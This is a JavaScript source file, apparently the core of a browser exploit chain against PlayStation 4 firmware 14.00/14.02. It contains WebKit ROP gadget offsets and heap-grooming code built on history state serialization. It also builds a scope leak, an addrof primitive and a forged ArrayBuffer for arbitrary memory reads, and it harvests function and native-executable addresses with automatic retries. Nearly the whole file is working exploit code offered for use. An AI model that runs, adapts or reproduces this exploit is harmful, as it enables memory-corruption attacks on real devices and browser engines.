/* ============ int64 ============ */
function zeroFill(n,w){w-=n.toString().length;return w>0?new Array(w+(/\./.test(n)?2:1)).join("0")+n:n+""}
function int64(low,hi){
  this.low=low>>>0;this.hi=hi>>>0;this.backing=null;
  this.add32inplace=function(v){let l=((this.low>>>0)+v&0xffffffff)>>>0,h=this.hi>>>0;if(l<this.low)h++;this.hi=h;this.low=l;
    if(this.backing!==null){if(this.backing.byteLength<v)throw new Error("int64.add32inplace: overflow");this.backing=new Uint8Array(this.backing.buffer,v,this.backing.byteLength-v)}};
  this.add32=function(v){let l=((this.low>>>0)+v&0xffffffff)>>>0,h=this.hi>>>0;if(l<this.low)h++;let r=new int64(l,h);
    if(this.backing!==null){if(this.backing.byteLength<v)throw new Error("int64.add32: overflow");r.backing=new Uint8Array(this.backing.buffer,v,this.backing.byteLength-v)}return r};
  this.sub32=function(v){let l=((this.low>>>0)-v&0xffffffff)>>>0,h=this.hi>>>0;if((l>this.low)&0xffffffff)h--;return new int64(l,h)};
  this.sub32inplace=function(v){let l=((this.low>>>0)-v&0xffffffff)>>>0,h=this.hi>>>0;if((l>this.low)&0xffffffff)h--;this.hi=h;this.low=l};
  this.and32=function(v){return new int64(this.low&v,this.hi)};
  this.and64=function(a,b){return new int64(this.low&a,this.hi&b)};
  this.toString=function(r=16){let lo=(this.low>>>0).toString(r),hi=(this.hi>>>0).toString(r);
    if(this.hi==0)return lo;const w=r===16?8:Math.ceil(32/Math.log2(r));return hi+zeroFill(lo,w)};
  return this;
}
globalThis.int64=int64;

/* ============ ps4_offsets (só 14.00 / 14.02) ============ */
const PS4 = {};
PS4["14.00"] = {
  fw_status:"14.00",
  wk_expm1_builtin:0x2586880, wk_JSFunction_m_function:0x28,
  wk_POP_RDI_RET:0x5c480, wk_POP_RSI_RET:0x6e45e, wk_POP_RDX_RET:0x12c5ba,
  wk_POP_RCX_RET:0x1bade, wk_POP_RAX_RET:0x10504, wk_POP_R8_RET:0x9b311,
  wk_POP_R9_RET:0x1dcfb1, wk_LEAVE_RET:0x182f7,
  wk_MOV_QWORD_PTR_RDI_RAX_RET:0x548b, wk_PUSH_RDX_POP_RSP_RET:0x2abccaa,
  wk_MOV_RDI_RSI_30_CALL:0x295f948, wk_POP_RAX_MOV_RAX_JMP_18:0x1d989e3,
  wk_PUSH_RBP_MOV_RBP_RSP_10:0x25bae0, wk_MOV_RDI_RAX_8_CALL_20:0x4a0406,
  wk_MOV_RDX_RAX_18_CALL_10:0x1ec3ada,
  pivot_view_sp:0x38, wk_ArrayBuffer_m_impl:0x10, wk_ArrayBuffer_m_contents_m_data:0x10,
  wk___imp___error:0x3cb8cc8, k__error:0x1a0f0,
  wk___imp_pthread_create:0x3cb9c00, k_pthread_create:0x21790,
  k_scan_stage1:0x40000, k_scan_stage2:0x60000,
};
PS4["14.02"] = Object.assign({}, PS4["14.00"]);
function offsetsFor(ua){
  const m=(ua||"").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
  if(!m) return {key:null,off:null};
  const key=m[1]+"."+parseInt(m[2],16).toString(16).padStart(2,"0");
  return {key,off:PS4[key]||null};
}

/* ============ core.js ============ */
const Core = (function(){
const DRAIN_COUNT_DEFAULT = 512;
const AUTO_RETRY_DELAY_MS = 50;
const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;
const HX1400_LIGHT_CORE = new URLSearchParams(location.search).get("hx1400")==="1";
const HX_MEM_LEVEL = (function(){
  try{const q=new URLSearchParams(location.search).get("mem");
    const n=parseInt(q||(HX1400_LIGHT_CORE?"2":"0"),10);
    if(Number.isFinite(n)&&n>=1&&n<=5)return n;
  }catch(e){}
  return HX1400_LIGHT_CORE?2:0;
})();
const HX_MEM_PROFILES=[null,
  {name:"mem1-balanced",slots:3000000,drain:48,drainsz:0x8000,slab:0x300000,bfly:0x60000,sep:0x8000,early:0x60000,guard:0x70000,pred:0x60000,final:0x60000},
  {name:"mem2-low",slots:1500000,drain:24,drainsz:0x8000,slab:0x200000,bfly:0x40000,sep:0x8000,early:0x40000,guard:0x50000,pred:0x40000,final:0x40000},
  {name:"mem3-verylow",slots:800000,drain:12,drainsz:0x4000,slab:0x100000,bfly:0x30000,sep:0x4000,early:0x30000,guard:0x40000,pred:0x30000,final:0x30000},
  {name:"mem4-minimum",slots:500000,drain:8,drainsz:0x4000,slab:0x100000,bfly:0x20000,sep:0x4000,early:0x20000,guard:0x30000,pred:0x20000,final:0x20000},
  {name:"mem5-extreme",slots:250000,drain:4,drainsz:0x4000,slab:0x10000,bfly:0x10000,sep:0x4000,early:0x10000,guard:0x18000,pred:0x10000,final:0x10000}
];
const HX_MEM=HX_MEM_PROFILES[HX_MEM_LEVEL]||null;
const CARRIER_CAP = HX_MEM ? HX_MEM.slots : 12000000;
let CARRIER_SLOTS = Math.min(CARRIER_CAP,400000);
let CARRIER_BYTES = CARRIER_SLOTS*8;
const CARRIER_MAX = 9000000;
function growCarrier(min){const cap=Math.min(CARRIER_CAP,CARRIER_MAX);if(CARRIER_SLOTS>=cap)return false;
  if(min>cap)return false;CARRIER_SLOTS=Math.min(cap,Math.max(min,CARRIER_SLOTS*4));CARRIER_BYTES=CARRIER_SLOTS*8;return true}
const symbolToString = Symbol.prototype.toString;
const _gOverride=(function(){const out={};try{const q=new URLSearchParams(location.search).getAll("g");
  for(const item of q){const[k,v]=item.split(":");const n=v&&v.startsWith("0x")?parseInt(v,16):parseInt(v,10);if(k&&n>0)out[k]=n}}catch(e){}return out})();
const _g=(name,dflt)=>typeof _gOverride[name]==="number"?_gOverride[name]:dflt;
let DRAIN_COUNT=DRAIN_COUNT_DEFAULT;
if(typeof _gOverride.drain==="number")DRAIN_COUNT=_gOverride.drain;else if(HX_MEM)DRAIN_COUNT=HX_MEM.drain;
const DRAIN_SIZE=_g("drainsz",HX_MEM?HX_MEM.drainsz:0x10000);
const SLAB_SIZE=_g("slab",HX_MEM?HX_MEM.slab:0x400000);
const BUTTERFLY_HOLE_SIZE=_g("bfly",HX_MEM?HX_MEM.bfly:0x81000);
const SEPARATOR_SIZE=_g("sep",HX_MEM?HX_MEM.sep:0x10000);
const EARLY_HOLE_SIZE=_g("early",HX_MEM?HX_MEM.early:0x70000);
const GUARD_SIZE=_g("guard",HX_MEM?HX_MEM.guard:0x90000);
const PREDECESSOR_SIZE=_g("pred",HX_MEM?HX_MEM.pred:0x80000);
const FINAL_HOLE_SIZE=_g("final",HX_MEM?HX_MEM.final:0x80000);
const CAPTURE_DELAY_MS=_g("cap",50);
const COMPOSE_DELAY_MS=_g("comp",100);
const CORE_MEM_WITHOUT_CARRIER=DRAIN_COUNT*DRAIN_SIZE+SLAB_SIZE+BUTTERFLY_HOLE_SIZE*2+SEPARATOR_SIZE+EARLY_HOLE_SIZE+GUARD_SIZE+PREDECESSOR_SIZE+FINAL_HOLE_SIZE;
globalThis.__CORE_MEM_INFO=Object.freeze({hx1400:HX1400_LIGHT_CORE,memLevel:HX_MEM_LEVEL,profile:HX_MEM?HX_MEM.name:null,
  get slots(){return CARRIER_SLOTS},get carrierBytes(){return CARRIER_BYTES},
  slotsStart:CARRIER_SLOTS,slotsCap:CARRIER_CAP,drainCount:DRAIN_COUNT,drainSize:DRAIN_SIZE,slabSize:SLAB_SIZE,
  get estimatedBytes(){return CORE_MEM_WITHOUT_CARRIER+CARRIER_BYTES}});
const RW_BUFFER_SIZE=0x100;
const IDENT_OFFSET=0x20;
const LEAK_SLOT_INDEX=2;
const LEAK_SLOT_OFFSET=0x10+8*LEAK_SLOT_INDEX;
const REVISION="slopkit-core-1";
const attemptKey=`${REVISION}:attempts`, burstKey=`${REVISION}:burst`;
const rwHeader=new Uint8Array(CELL_BYTES),targetHeader=new Uint8Array(NATIVE_EXECUTABLE_BYTES),
  holderHeader=new Uint8Array(HOLDER_BYTES),scratchBits=new ArrayBuffer(8),scratchBytes=new Uint8Array(scratchBits),
  scratchWords=new Uint32Array(scratchBits),scratchDouble=new Float64Array(scratchBits);
const identityMagic=new Uint8Array([0x5a,0xa5,0xc3,0x3c,0xde,0xad,0xbe,0xef]);
const identityBytes=new Uint8Array(8);
let attemptNumber=0,attemptCeiling=0,keepIndex=0,stopped=false,keepAlive=null,onEvent=null,
  criticalBarrier=null,settleResolve=null,settleReject=null,running=false;
let referenceTarget=null,rwBuffer=null,rwView=null,rwMirror=null,targetBuffer=null,targetView=null;
const nativeTarget=parseInt;
let fakeHost=null,lengthWord=null,anchorElement=null,markerObjectA=null,markerObjectB=null,
  targetHolder=null,holderGuardA=null,holderGuardB=null,fillerGraph=null,outerGraph=null;
let leakedScope=null,getterCarrier=null,preparedSymbolObject=null,capturedString=null,capturedWords=null,
  copiedLength=0,captureState=0,captureError=null,hostAddress=NaN,fakeAddress=NaN;
let predecessorWords=null,pointerLow=0,pointerHigh=0,targetAddress=NaN,targetAddressLow=0,targetAddressHigh=0;
let nativeTargetAddress=NaN,anchorElementAddress=NaN,markerAAddress=NaN,markerBAddress=NaN;
let rwOriginalVector=NaN,rwHeaderOK=false,holderHeaderOK=false,functionHeaderOK=false,nativeExecutableHeaderOK=false,
  functionStructureID=0,nativeExecutableStructureID=0,executableAddress=NaN,nativeFunctionAddress=NaN,
  nativeConstructorAddress=NaN,pointersRepeated=false,restoreObserved=false,retrySafe=false,retryScheduled=false,
  attemptPersisted=false,candidateEverReturned=false,candidateMutationStarted=false,zeroHeaderMiss=false,identityResult=0;
let compositionState=0,compositionLength=0,compositionError=null,liveCandidate=null,fakeReleased=false;
const UNSEEN=-1;
const profile={carrierSID:UNSEEN,carrierType:UNSEEN,carrierFlags:UNSEEN,carrierMode:UNSEEN,carrierByte28:UNSEEN,
  holderSID:UNSEEN,holderType:UNSEEN,holderFlags:UNSEEN,functionSID:UNSEEN,functionType:UNSEEN,functionFlags:UNSEEN,
  nativeExecSID:UNSEEN,nativeExecType:UNSEEN,nativeExecFlags:UNSEEN,cellSize:UNSEEN,
  vectorOffset:0x10,inlineSlotOffset:0x10,butterflyOffset:0x08,vectorOffsetMeasured:false};
function resetProfile(){for(const k of["carrierSID","carrierType","carrierFlags","carrierMode","carrierByte28","holderSID","holderType","holderFlags","functionSID","functionType","functionFlags","nativeExecSID","nativeExecType","nativeExecFlags"])profile[k]=UNSEEN}
function hex(v){return `0x${v.toString(16)}`}
function buffer(s){return new ArrayBuffer(s)}
function allZero(b,s,e){for(let i=s;i<e;++i)if(b[i]!==0)return false;return true}
function uint32At(b,o){return (b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000)}
function low48At(b,o){return b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000+b[o+4]*0x100000000+b[o+5]*0x10000000000}
function readBytes(d,s,c){for(let i=0;i<c;++i)d[i]=s[i]}
function sameBytes(a,b,c){for(let i=0;i<c;++i)if(a[i]!==b[i])return false;return true}
function readTwiceMatches(d,s,c){readBytes(d,s,c);return sameBytes(d,s,c)}
function aimCarrier(c,a){const h=Math.floor(a/0x100000000);scratchWords[0]=a-h*0x100000000;scratchWords[1]=h;for(let i=0;i<8;++i)c[0x10+i]=scratchBytes[i]}
function restoreCarrier(c){for(let i=0;i<8;++i)c[0x10+i]=rwHeader[0x10+i]}
function pointerFromWords(w,o){if(w[o+3]!==0)return NaN;return w[o]+w[o+1]*0x10000+w[o+2]*0x100000000}
function plausibleCell(v){return v>0x100000000&&v<=0xffffffffffff&&v<=9007199254740991&&Math.floor(v)===v&&v%8===0}
function plausibleAddress(v){return v>0x100000000&&v<=0xffffffffffff&&v<=9007199254740991&&Math.floor(v)===v}
function canonicalLow48(b,o){return b[o+6]===0&&b[o+7]===0}
function dumpHex(b,c){let o="";for(let i=0;i<c;++i)o+=b[i].toString(16).padStart(2,"0");return o}
function encodedHeaderNumber(){const r=new ArrayBuffer(8),u=new Uint32Array(r),f=new Float64Array(r);u[0]=0x00004250;u[1]=0x01062800;return f[0]}
function emit(t,d){if(onEvent===null)return;try{onEvent(t,d===undefined?"":String(d),attemptNumber)}catch(e){}}
function checkCarrierIdentity(c){
  if(!plausibleAddress(rwOriginalVector)||rwOriginalVector%8!==0||IDENT_OFFSET+8>RW_BUFFER_SIZE)return 0;
  aimCarrier(c,rwOriginalVector+IDENT_OFFSET);readBytes(identityBytes,rwView,8);restoreCarrier(c);
  return sameBytes(identityBytes,identityMagic,8)&&rwView[0]===0x3c?1:-1;
}
function runIdentityProof(c){candidateMutationStarted=true;identityResult=checkCarrierIdentity(c);return identityResult===1}
function ceilingReached(){return attemptCeiling>0&&attemptNumber>=attemptCeiling}
function giveUp(r){stopped=true;emit("CORE-GIVE-UP",`reason=${r}-attempts=${attemptNumber}`);const j=settleReject;settleResolve=null;settleReject=null;running=false;if(j!==null)j(new Error(`core: gave up after ${attemptNumber} attempts (${r})`))}
function failed(){
  if(ceilingReached()){giveUp("attempt-ceiling");return}
  emit("AUTO-RETRY-AFTER-FAILURE",`attempt=${attemptNumber}`);stopped=false;retryScheduled=false;
  setTimeout(()=>{try{history.replaceState(null,"")}catch(e){}attemptNumber++;startAttempt()},AUTO_RETRY_DELAY_MS);
}
function releaseAttemptAllocations(){
  referenceTarget=rwBuffer=rwView=rwMirror=targetBuffer=targetView=fakeHost=lengthWord=anchorElement=markerObjectA=markerObjectB=targetHolder=holderGuardA=holderGuardB=fillerGraph=outerGraph=leakedScope=getterCarrier=preparedSymbolObject=capturedString=capturedWords=predecessorWords=keepAlive=null;
  try{history.replaceState(null,"")}catch(e){}
  if(typeof globalThis.gc==="function")try{globalThis.gc()}catch(e){}
}
function scheduleSafeRetry(reason){
  if(retryScheduled||stopped)return;
  const safe=!candidateEverReturned||(zeroHeaderMiss&&!candidateMutationStarted);
  if(!retrySafe||!safe||candidateMutationStarted||!attemptPersisted){emit("AUTO-RETRY-NOT-SCHEDULED",`reason=${reason}-safe=${retrySafe}-seen=${candidateEverReturned}-mutated=${candidateMutationStarted}-state=${safe}-persisted=${attemptPersisted}`);failed();return}
  if(ceilingReached()){giveUp("attempt-ceiling");return}
  retryScheduled=true;const next=attemptNumber+1;emit("AUTO-RETRY-SCHEDULED",`reason=${reason}-next=${next}`);releaseAttemptAllocations();
  setTimeout(()=>{
    const s=!candidateEverReturned||(zeroHeaderMiss&&!candidateMutationStarted);
    if(!retrySafe||!s||candidateMutationStarted||stopped){emit("AUTO-RETRY-CANCELLED",`reason=${reason}`);failed();return}
    attemptNumber=next;startAttempt();
  },Math.max(AUTO_RETRY_DELAY_MS,750));
}
function finishEarlySafeAttempt(tag,extra,reason){retrySafe=true;emit(tag,`${extra}-retry-safe=true-candidate-seen=false-candidate-mutated=false`);scheduleSafeRetry(reason)}
function resetAttemptState(){
  referenceTarget=rwBuffer=rwView=rwMirror=targetBuffer=targetView=fakeHost=lengthWord=anchorElement=markerObjectA=markerObjectB=targetHolder=holderGuardA=holderGuardB=fillerGraph=outerGraph=leakedScope=getterCarrier=preparedSymbolObject=capturedString=capturedWords=null;
  copiedLength=0;captureState=0;captureError=null;hostAddress=NaN;fakeAddress=NaN;predecessorWords=null;
  keepAlive=new Array(DRAIN_COUNT+3);keepIndex=0;pointerLow=0;pointerHigh=0;targetAddress=NaN;targetAddressLow=0;targetAddressHigh=0;
  nativeTargetAddress=NaN;anchorElementAddress=NaN;markerAAddress=NaN;markerBAddress=NaN;rwOriginalVector=NaN;
  rwHeaderOK=holderHeaderOK=functionHeaderOK=nativeExecutableHeaderOK=false;functionStructureID=nativeExecutableStructureID=0;
  executableAddress=NaN;nativeFunctionAddress=NaN;nativeConstructorAddress=NaN;pointersRepeated=restoreObserved=false;
  retrySafe=retryScheduled=false;candidateEverReturned=candidateMutationStarted=zeroHeaderMiss=false;identityResult=0;
  identityBytes.fill(0);compositionState=0;compositionLength=0;compositionError=null;liveCandidate=null;
  resetProfile();rwHeader.fill(0);targetHeader.fill(0);holderHeader.fill(0);
}
function startAttempt(){
  if(fakeReleased||stopped)return;resetAttemptState();
  try{sessionStorage.setItem(attemptKey,String(attemptNumber));attemptPersisted=sessionStorage.getItem(attemptKey)===String(attemptNumber)}catch(e){}
  emit("ATTEMPT-START",`persisted=${attemptPersisted}-capture=${CAPTURE_DELAY_MS}-compose=${COMPOSE_DELAY_MS}`);
  try{buildAndStoreGraph();prepareAddrof()}catch(e){finishEarlySafeAttempt("SETUP-THREW",`${e?.name}:${String(e?.message).slice(0,80)}`,"setup-threw")}
}
function leakScopeObject(){
  class Leaker{leak(){return super.foo}}
  Leaker.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r}});
  const leak=Leaker.prototype.leak;return (function(){return leak()})();
}
function prepareSymbolWrapper(F){
  leakedScope=leakScopeObject();if(leakedScope===undefined||leakedScope===null)throw new Error("scope-not-leaked");
  for(let i=0;i<512;i++)leakedScope[`p${i}`]=i;
  for(let j=0;j<8;j++)leakedScope[j]=1.1*j;
  Object.defineProperty(leakedScope,"g",{get:F,configurable:true});
  return Object(leakedScope.g);
}
function buildFakeHost(){
  rwBuffer=new ArrayBuffer(RW_BUFFER_SIZE);rwView=new Uint8Array(rwBuffer);rwMirror=new Uint8Array(rwBuffer);rwMirror[0]=0x3c;
  targetBuffer=new ArrayBuffer(0x20);targetView=new Uint8Array(targetBuffer);targetView[0]=0xa5;
  lengthWord={keep:0x51515151};
  fakeHost={q0:encodedHeaderNumber(),q1:1.1,q2:rwView,q3:lengthWord,q4:2.2,q5:3.3};
  delete fakeHost.q1;delete fakeHost.q4;delete fakeHost.q5;
  if(!Number.isFinite(fakeHost.q0)||fakeHost.q2!==rwView||fakeHost.q3!==lengthWord||rwView[0]!==0x3c||targetView[0]!==0xa5||typeof nativeTarget!=="function")throw new Error("fake-host-shape-failed");
  anchorElement=document.createElement("textarea");
  markerObjectA={marker:0x4d41524b,kind:"probe-marker-a"};markerObjectB={marker:0x4d41524c,kind:"probe-marker-b"};
  holderGuardA={marker:0x484f4c44};holderGuardB={marker:0x47554152};
  targetHolder={q0:nativeTarget,q1:anchorElement,q2:markerObjectA,q3:markerObjectB,q4:holderGuardA,q5:holderGuardB};
  if(targetHolder.q0!==nativeTarget||targetHolder.q1!==anchorElement||targetHolder.q2!==markerObjectA||targetHolder.q3!==markerObjectB||targetHolder.q4!==holderGuardA||targetHolder.q5!==holderGuardB||anchorElement===null||typeof anchorElement!=="object"||markerObjectA.marker!==0x4d41524b||markerObjectB.marker!==0x4d41524c)throw new Error("probe-holder-shape-failed");
}
function buildAndStoreGraph(){
  referenceTarget={marker:0x51515151,kind:"serialized-reference"};
  emit("SSV-BUILD",`k=${K}-n=${DRAIN_COUNT}`);
  fillerGraph=new Array(0xfffd);let pos=0;const huge=1n<<40n;
  for(let b=0;b<FILLER_BIGINTS;++b)fillerGraph[pos++]=huge+BigInt(b);
  for(let o=0;o<FILLER_OBJECTS;++o)fillerGraph[pos++]={};
  outerGraph=new Array(CONTROL_INDEX+1);
  outerGraph[0]=fillerGraph;outerGraph[1]=referenceTarget;outerGraph[2]=referenceTarget;outerGraph[CONTROL_INDEX]=CONTROL_INT;
  emit("SSV-BUILT",`dup=${DUPLICATE_INDEX}`);
  emit("SSV-STORE-ENTER",`writer=0x${(0x10000-K).toString(16)}`);
  history.replaceState(outerGraph,"");
  emit("SSV-STORED","fake-host-and-holder-not-serialized");
}
function prepareAddrof(){
  capturedWords=new Uint16Array(16);
  getterCarrier=function getterCarrierFunction(){return 7};
  emit("ADDROF-PREP-BEGIN",`slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
  for(let i=0;i<CARRIER_SLOTS;i++)getterCarrier[i]=0;
  buildFakeHost();
  for(let i=0;i<8;++i)rwView[IDENT_OFFSET+i]=identityMagic[i];
  getterCarrier[0]=fakeHost;getterCarrier[1]=targetHolder;getterCarrier[2]=fakeHost;getterCarrier[3]=targetHolder;
  emit("ADDROF-CARRIER-DONE","host-holder-host-holder");
  preparedSymbolObject=prepareSymbolWrapper(getterCarrier);
  emit("ADDROF-WRAPPER-READY",`wait=${CAPTURE_DELAY_MS}ms`);
  setTimeout(runAddrofCapture,CAPTURE_DELAY_MS);
  setTimeout(beginComposition,COMPOSE_DELAY_MS);
}
function runAddrofCapture(){
  try{capturedString=symbolToString.call(preparedSymbolObject);copiedLength=capturedString.length;
    for(let i=0;i<16;i++)capturedWords[i]=capturedString.charCodeAt(7+i);
    capturedString=null;captureState=1;
  }catch(e){captureError=e;captureState=-1}
}
function fillRawCellPointers(backing,pointer){
  pointerHigh=Math.floor(pointer/0x100000000);pointerLow=pointer-pointerHigh*0x100000000;
  if(!plausibleCell(pointer)||pointerHigh<0||pointerHigh>0xffff||Math.floor(pointerLow)!==pointerLow||pointerLow<0||pointerLow>0xffffffff||pointerLow+pointerHigh*0x100000000!==pointer)throw new Error("invalid-low48-fake-address");
  predecessorWords=new Uint32Array(backing);
  for(let i=0;i<predecessorWords.length;i+=2){predecessorWords[i]=pointerLow;predecessorWords[i+1]=pointerHigh}
  const last=predecessorWords.length-2;
  if(predecessorWords[0]!==pointerLow||predecessorWords[1]!==pointerHigh||predecessorWords[last]!==pointerLow||predecessorWords[last+1]!==pointerHigh)throw new Error("pointer-fill-verification-failed");
}
function clearPredecessor(){if(predecessorWords!==null)predecessorWords.fill(0)}
function loadHistoryCritical(){
  let result=null,candidate=null,rwHeaderCaptured=false,rwVectorTouched=false;
  try{
    result=history.state;compositionLength=result.length;
    if(compositionLength!==EXPECTED_LENGTH){result[DUPLICATE_INDEX]=undefined;result=null;clearPredecessor();retrySafe=true;compositionState=3;return}
    if(result[1]===result[DUPLICATE_INDEX]){result[DUPLICATE_INDEX]=undefined;candidate=null;result=null;clearPredecessor();retrySafe=true;compositionState=2;return}
    candidate=result[DUPLICATE_INDEX];candidateEverReturned=true;result[DUPLICATE_INDEX]=undefined;result=null;
    readBytes(rwHeader,candidate,CELL_BYTES);rwHeaderCaptured=true;
    const rwSID=uint32At(rwHeader,0),rwButterfly=low48At(rwHeader,8),rwLength=uint32At(rwHeader,0x18);
    rwOriginalVector=low48At(rwHeader,0x10);
    const rwTailByte=rwHeader[0x20],rwOffsetZero=allZero(rwHeader,0x21,0x28)&&(rwTailByte===0||rwTailByte===2);
    profile.carrierSID=rwSID;profile.carrierType=rwHeader[5];profile.carrierFlags=rwHeader[6];profile.carrierMode=rwHeader[0x1c];profile.carrierByte28=rwHeader[0x28];profile.carrierByte20=rwHeader[0x20];
    rwHeaderOK=rwSID>=0x100&&rwSID<0x08000000&&rwHeader[4]===0&&(rwHeader[7]===0||rwHeader[7]===1)&&rwHeader[0x0e]===0&&rwHeader[0x0f]===0&&rwButterfly>0x100000000&&rwButterfly%8===0&&rwHeader[0x16]===0&&rwHeader[0x17]===0&&rwOriginalVector>0x100000000&&rwOriginalVector%8===0&&rwLength===RW_BUFFER_SIZE&&rwHeader[0x1d]===0&&rwHeader[0x1e]===0&&rwHeader[0x1f]===0&&rwOffsetZero;
    if(!rwHeaderOK){zeroHeaderMiss=allZero(rwHeader,0,CELL_BYTES);retrySafe=zeroHeaderMiss&&!rwVectorTouched&&!candidateMutationStarted;candidate=null;clearPredecessor();compositionState=3;return}
    rwVectorTouched=true;const identityProved=runIdentityProof(candidate);rwVectorTouched=false;
    if(!identityProved){candidate=null;clearPredecessor();compositionState=3;return}
    for(let i=0;i<8;++i)scratchBytes[i]=rwHeader[i];
    if(scratchBytes[6]>=2)scratchBytes[6]-=2;else{scratchBytes[6]=(scratchBytes[6]+0x100-2)&0xff;scratchBytes[7]=(scratchBytes[7]-1)&0xff}
    const upgradedHeader=scratchDouble[0];
    const upgradedFinite=upgradedHeader===upgradedHeader&&upgradedHeader!==Infinity&&upgradedHeader!==-Infinity;
    if(!upgradedFinite){candidate=null;clearPredecessor();compositionState=3;return}
    candidateMutationStarted=true;fakeHost.q0=upgradedHeader;
    if(fakeHost.q0!==upgradedHeader){candidate=null;clearPredecessor();compositionState=3;return}
    rwVectorTouched=true;aimCarrier(candidate,targetAddress);
    const holderRepeated=readTwiceMatches(holderHeader,rwView,HOLDER_BYTES);
    const holderSID=uint32At(holderHeader,0),holderButterflyZero=allZero(holderHeader,0x08,0x10);
    nativeTargetAddress=low48At(holderHeader,0x10);anchorElementAddress=low48At(holderHeader,0x18);
    markerAAddress=low48At(holderHeader,0x20);markerBAddress=low48At(holderHeader,0x28);
    const holderGuardAAddress=low48At(holderHeader,0x30),holderGuardBAddress=low48At(holderHeader,0x38);
    profile.holderSID=holderSID;profile.holderType=holderHeader[5];profile.holderFlags=holderHeader[6];
    holderHeaderOK=holderRepeated&&holderSID>=0x100&&holderSID<0x08000000&&targetAddress%0x10===0&&holderHeader[4]===0&&(holderHeader[7]===0||holderHeader[7]===1)&&holderButterflyZero&&plausibleCell(nativeTargetAddress)&&plausibleCell(anchorElementAddress)&&plausibleCell(markerAAddress)&&plausibleCell(markerBAddress)&&plausibleCell(holderGuardAAddress)&&plausibleCell(holderGuardBAddress)&&canonicalLow48(holderHeader,0x10)&&canonicalLow48(holderHeader,0x18)&&canonicalLow48(holderHeader,0x20)&&canonicalLow48(holderHeader,0x28)&&canonicalLow48(holderHeader,0x30)&&canonicalLow48(holderHeader,0x38)&&nativeTargetAddress!==anchorElementAddress&&nativeTargetAddress!==markerAAddress&&anchorElementAddress!==markerAAddress&&markerAAddress!==markerBAddress&&holderGuardAAddress!==holderGuardBAddress;
    if(!holderHeaderOK){restoreCarrier(candidate);rwVectorTouched=false;candidate=null;clearPredecessor();compositionState=3;return}
    aimCarrier(candidate,nativeTargetAddress);readBytes(targetHeader,rwView,FUNCTION_BYTES);
    functionStructureID=uint32At(targetHeader,0);const functionButterfly=low48At(targetHeader,0x08),functionScope=low48At(targetHeader,0x10);
    executableAddress=low48At(targetHeader,0x18);
    profile.functionSID=functionStructureID;profile.functionType=targetHeader[5];profile.functionFlags=targetHeader[6];
    const functionType1=targetHeader[5];
    functionHeaderOK=functionStructureID>=0x100&&functionStructureID<0x08000000&&nativeTargetAddress%0x10===0&&targetHeader[4]===0&&(targetHeader[7]===0||targetHeader[7]===1)&&targetHeader[0x0e]===0&&targetHeader[0x0f]===0&&targetHeader[0x16]===0&&targetHeader[0x17]===0&&targetHeader[0x1e]===0&&targetHeader[0x1f]===0&&functionButterfly>0x100000000&&functionButterfly<=0xffffffffffff&&functionButterfly%8===0&&functionScope>0x100000000&&functionScope<=0xffffffffffff&&functionScope%8===0&&executableAddress>0x100000000&&executableAddress<=0xffffffffffff&&executableAddress%0x10===0&&(executableAddress&1)===0;
    if(!functionHeaderOK){restoreCarrier(candidate);rwVectorTouched=false;candidate=null;clearPredecessor();compositionState=3;return}
    aimCarrier(candidate,executableAddress);readBytes(targetHeader,rwView,NATIVE_EXECUTABLE_BYTES);
    nativeExecutableStructureID=uint32At(targetHeader,0);nativeFunctionAddress=low48At(targetHeader,0x28);nativeConstructorAddress=low48At(targetHeader,0x30);
    profile.nativeExecSID=nativeExecutableStructureID;profile.nativeExecType=targetHeader[5];profile.nativeExecFlags=targetHeader[6];
    try{globalThis.__ps5NativeCtor=nativeConstructorAddress}catch(e){}
    const nativeExecType1=targetHeader[5];
    nativeExecutableHeaderOK=nativeExecutableStructureID>=0x100&&nativeExecutableStructureID<0x08000000&&targetHeader[4]===0&&(targetHeader[7]===0||targetHeader[7]===1)&&targetHeader[0x2e]===0&&targetHeader[0x2f]===0&&targetHeader[0x36]===0&&targetHeader[0x37]===0&&plausibleAddress(nativeFunctionAddress)&&plausibleAddress(nativeConstructorAddress)&&canonicalLow48(targetHeader,0x28)&&canonicalLow48(targetHeader,0x30)&&nativeFunctionAddress!==nativeConstructorAddress;
    if(!nativeExecutableHeaderOK){restoreCarrier(candidate);rwVectorTouched=false;candidate=null;clearPredecessor();compositionState=3;return}
    aimCarrier(candidate,nativeTargetAddress);
    const executableAddress2=low48At(rwView,0x18),functionType2=rwView[5];
    aimCarrier(candidate,executableAddress);
    const nativeFunctionAddress2=low48At(rwView,0x28),nativeConstructorAddress2=low48At(rwView,0x30),nativeExecutableType2=rwView[5];
    pointersRepeated=executableAddress2===executableAddress&&nativeFunctionAddress2===nativeFunctionAddress&&nativeConstructorAddress2===nativeConstructorAddress&&functionType2===functionType1&&nativeExecutableType2===nativeExecType1;
    restoreCarrier(candidate);rwVectorTouched=false;targetView[0]=0xa5;rwMirror[0]=0x3c;
    restoreObserved=rwView[0]===0x3c&&rwMirror[0]===0x3c&&targetView[0]===0xa5;
    liveCandidate=candidate;candidate=null;clearPredecessor();compositionState=1;
  }catch(error){
    retrySafe=candidate===null&&result===null&&!rwHeaderCaptured&&error?.name==="TypeError";
    if(result!==null)try{result[DUPLICATE_INDEX]=undefined}catch(e){}
    if(candidate!==null&&rwHeaderCaptured&&rwVectorTouched)try{restoreCarrier(candidate)}catch(e){}
    candidate=result=null;
    try{targetView[0]=0xa5}catch(e){}try{rwMirror[0]=0x3c}catch(e){}try{clearPredecessor()}catch(e){}
    compositionError=error;compositionState=-1;
  }
}
function runGroomAndLoad(){
  try{
    emit("SSV-GROOM-ENTER",`n=${DRAIN_COUNT}`);
    const ch=new MessageChannel();ch.port1.close();ch.port2.close();
    for(let i=0;i<DRAIN_COUNT;++i)keepAlive[keepIndex++]=buffer(DRAIN_SIZE);
    let slab=buffer(SLAB_SIZE);ch.port1.postMessage(0,[slab]);slab=null;
